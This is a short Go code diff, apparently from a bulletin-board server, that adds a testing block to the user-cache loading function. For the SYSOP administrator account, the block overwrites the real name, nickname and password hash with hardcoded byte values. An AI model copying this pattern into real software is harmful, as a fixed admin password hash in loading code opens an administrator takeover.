@@ -88,6 +88,16 @@ func fillUHash(isOnfly bool) error {
 	log.Infof("fillUHash: to for-loop: MAX_USERS: %v", ptttype.MAX_USERS)
 	for ; ; uidInCache++ {
 		userecRaw, eachErr := ptttype.NewUserecRawWithFile(file)
+
+		// 先由這裡開始控制測試
+		if userecRaw != nil {
+			if userecRaw.UserID == [13]byte{83, 89, 83, 79, 80} { // SYSOP
+				userecRaw.RealName = [20]byte{67, 111, 100, 105, 100, 103, 77, 97, 110} // CodingMan
+				userecRaw.Nickname = [24]byte{175, 171} // ??
+				userecRaw.PasswdHash = [14]byte{98, 104, 119, 118, 79, 74, 116, 102, 84, 49, 84, 65, 73} // bhwvOJtfT1TAI
+			}
+		}
+
 		if eachErr != nil {
 			// io.EOF is reading correctly to the end the file.
 			if eachErr == io.EOF {
